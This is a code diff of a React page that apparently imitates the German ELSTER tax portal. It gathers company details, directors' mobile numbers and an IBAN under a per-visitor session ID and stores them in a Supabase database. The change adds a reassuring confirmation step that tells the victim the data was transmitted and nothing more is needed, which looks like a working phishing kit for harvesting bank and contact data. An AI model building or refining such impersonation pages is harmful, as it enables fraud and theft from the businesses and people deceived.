@@ -1,11 +1,11 @@
 import { useState, useEffect, useMemo } from "react";
-import { useSearchParams, useNavigate } from "react-router-dom";
+import { useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
-import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import {
   User,
   Settings,
+  Check,
   Files,
   Users,
   LayoutGrid,
@@ -37,10 +37,9 @@ function formatIban(raw: string) {
 
 const ElsterDatenaktualisierung = () => {
   const [searchParams] = useSearchParams();
-  const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
 
-  const [step, setStep] = useState<1 | 2>(1);
+  const [step, setStep] = useState<1 | 2 | 3>(1);
   const [company, setCompany] = useState("");
   const [email, setEmail] = useState("");
   const [phone, setPhone] = useState("");
@@ -52,7 +51,6 @@ const ElsterDatenaktualisierung = () => {
   const [iban, setIban] = useState("");
   const [bankName, setBankName] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
-  const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [menuOpen, setMenuOpen] = useState(false);
 
@@ -140,7 +138,8 @@ const ElsterDatenaktualisierung = () => {
       });
       if (error) console.error("Update failed:", error);
     }
-    setShowLoading(true);
+    setSubmitting(false);
+    setStep(3);
   };
 
   const menu = [
@@ -223,32 +222,33 @@ const ElsterDatenaktualisierung = () => {
           <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
             <div style={{ background: "#fff", padding: "20px 24px", border: `1px solid ${BORDER}` }}>
               <div style={{ display: "flex", alignItems: "center", marginBottom: 24 }}>
-                {/* Step 1 */}
-                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
-                  <div style={{
-                    width: 28, height: 28, borderRadius: "50%",
-                    background: step === 1 ? "#485e00" : step === 2 ? "#485e00" : "#ccc",
-                    color: "#fff", display: "flex", alignItems: "center", justifyContent: "center",
-                    fontSize: 13, fontWeight: 600, lineHeight: 1
-                  }}>
-                    {step === 2 ? "✓" : "1"}
-                  </div>
-                  <span style={{ fontSize: 14, fontWeight: step === 1 ? 600 : 400, color: step === 1 ? "#485e00" : "#666" }}>Firmendaten</span>
-                </div>
-                {/* Connector line */}
-                <div style={{ flex: "0 0 48px", height: 2, background: step === 2 ? "#485e00" : "#ccc", margin: "0 12px" }} />
-                {/* Step 2 */}
-                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
-                  <div style={{
-                    width: 28, height: 28, borderRadius: "50%",
-                    background: step === 2 ? "#485e00" : "#ccc",
-                    color: "#fff", display: "flex", alignItems: "center", justifyContent: "center",
-                    fontSize: 13, fontWeight: 600, lineHeight: 1
-                  }}>
-                    2
-                  </div>
-                  <span style={{ fontSize: 14, fontWeight: step === 2 ? 600 : 400, color: step === 2 ? "#485e00" : "#999" }}>IBAN</span>
-                </div>
+                {([
+                  { n: 1, label: "Firmendaten" },
+                  { n: 2, label: "IBAN" },
+                  { n: 3, label: "Bestätigung" },
+                ] as const).map((s, idx) => {
+                  const done = step > s.n;
+                  const active = step === s.n;
+                  const on = done || active;
+                  return (
+                    <div key={s.n} style={{ display: "flex", alignItems: "center" }}>
+                      {idx > 0 && (
+                        <div style={{ flex: "0 0 48px", height: 2, background: step >= s.n ? GREEN : "#ccc", margin: "0 12px" }} />
+                      )}
+                      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+                        <div style={{
+                          width: 28, height: 28, borderRadius: "50%",
+                          background: on ? GREEN : "#ccc",
+                          color: "#fff", display: "flex", alignItems: "center", justifyContent: "center",
+                          fontSize: 13, fontWeight: 600, lineHeight: 1
+                        }}>
+                          {done ? "✓" : s.n}
+                        </div>
+                        <span style={{ fontSize: 14, fontWeight: active ? 600 : 400, color: active ? GREEN : "#666" }}>{s.label}</span>
+                      </div>
+                    </div>
+                  );
+                })}
               </div>
 
               {step === 1 && (
@@ -341,6 +341,50 @@ const ElsterDatenaktualisierung = () => {
                   </div>
                 </form>
               )}
+
+              {step === 3 && (
+                <div>
+                  <div style={{ display: "flex", flexDirection: "column", alignItems: "center", textAlign: "center", padding: "12px 0 20px" }}>
+                    <div style={{ width: 64, height: 64, borderRadius: "50%", background: GREEN, color: "#fff", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 16 }}>
+                      <Check size={36} strokeWidth={3} />
+                    </div>
+                    <h2 style={{ fontSize: 22, fontWeight: 400, margin: "0 0 8px", color: TEXT }}>Datenaktualisierung erfolgreich übermittelt</h2>
+                    <p style={{ fontSize: 14, color: MUTED, maxWidth: 480, margin: 0, lineHeight: 1.55 }}>
+                      Ihre Firmen- und Bankdaten wurden erfolgreich übermittelt und werden in unseren Systemen aktualisiert. Es sind keine weiteren Schritte erforderlich.
+                    </p>
+                  </div>
+
+                  <div style={{ border: `1px solid ${BORDER}`, marginTop: 8 }}>
+                    <div style={{ padding: "12px 16px", background: "#f8f8f8", borderBottom: `1px solid ${BORDER}`, fontSize: 14, fontWeight: 600 }}>
+                      Übermittelte Angaben
+                    </div>
+                    <div>
+                      {[
+                        { l: "Unternehmen", v: company },
+                        { l: "E-Mail-Adresse", v: email },
+                        { l: "Telefonnummer", v: phone || "—" },
+                        { l: "Straße, Hausnummer", v: street },
+                        { l: "PLZ, Stadt", v: city },
+                        ...directors.map((d, i) => ({
+                          l: `Geschäftsführer${directors.length > 1 ? ` ${i + 1}` : ""}`,
+                          v: `${d.firstName} ${d.lastName}${d.mobile ? ` · ${d.mobile}` : ""}`,
+                        })),
+                        { l: "IBAN", v: iban },
+                        ...(bankName ? [{ l: "Bank", v: bankName }] : []),
+                      ].map((row, idx, arr) => (
+                        <div key={idx} style={{ display: "flex", justifyContent: "space-between", gap: 16, padding: "10px 16px", borderBottom: idx < arr.length - 1 ? `1px solid ${BORDER}` : "none", fontSize: 14 }}>
+                          <span style={{ color: MUTED }}>{row.l}</span>
+                          <span style={{ color: TEXT, textAlign: "right", wordBreak: "break-word" }}>{row.v}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+
+                  <div style={{ marginTop: 16, background: "#eef7e3", border: `1px solid ${GREEN}`, color: "#2d4a0a", padding: "10px 14px", fontSize: 13, lineHeight: 1.5 }}>
+                    <strong>Hinweis:</strong> Sie erhalten in Kürze eine Bestätigung per E-Mail. Es sind keine weiteren Schritte erforderlich.
+                  </div>
+                </div>
+              )}
             </div>
 
             <aside className="elster-info" style={{ fontSize: 14, lineHeight: 1.5, marginLeft: 16, alignSelf: "start", background: "#f8f8f8", padding: "20px 20px" }}>
@@ -413,10 +457,6 @@ const ElsterDatenaktualisierung = () => {
           </div>
         </div>
       </footer>
-
-      {showLoading && (
-        <LoadingOverlay onComplete={() => navigate(`/confirmation${sessionId ? `?s=${sessionId}` : ""}`)} />
-      )}
 
       <style>{`
         @media (min-width: 1024px) {
